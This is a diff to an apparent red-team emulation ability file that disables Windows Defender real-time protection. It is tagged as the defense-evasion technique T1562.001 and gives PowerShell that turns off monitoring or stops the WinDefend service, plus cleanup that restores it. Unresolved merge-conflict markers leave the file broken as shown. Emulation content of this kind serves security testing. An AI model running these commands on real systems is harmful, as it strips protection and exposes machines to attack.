@@ -5,12 +5,46 @@
   description: Disable Windows Defender Real-Time Protection
   tactic: defense-evasion
   technique:
+<<<<<<< HEAD
     attack_id: T1089
     name: Disabling Security Tools
+=======
+    attack_id: T1562.001
+    name: "Impair Defenses: Disable or Modify Tools"
+  privilege: Elevated
+>>>>>>> upstream/master
   platforms:
     windows:
       psh:
         command: |
+<<<<<<< HEAD
           Set-MPPreference -DisableRealtimeMonitoring 1
         cleanup:
           Set-MPPreference -DisableRealtimeMonitoring 0
+=======
+          if (Get-Command "Set-MPPreference" -ErrorAction SilentlyContinue) {
+            Set-MPPreference -DisableRealtimeMonitoring 1;
+          } else {
+            $service = Get-Service WinDefend -ErrorAction SilentlyContinue;
+            if ($service) {
+              if ($service.Status -eq "Running") {
+                Stop-Service WinDefend;
+              }
+            } else {
+              echo "Windows Defender service not found.";
+              exit 1;
+            };
+          };
+        cleanup:
+          if (Get-Command "Set-MPPreference" -ErrorAction SilentlyContinue) {
+            Set-MPPreference -DisableRealtimeMonitoring 0;
+          } else {
+            $service = Get-Service WinDefend -ErrorAction SilentlyContinue;
+            if ($service) {
+              Start-Service WinDefend;
+            } else {
+              echo "Windows Defender service not found.";
+              exit 1;
+            };
+          };
+>>>>>>> upstream/master
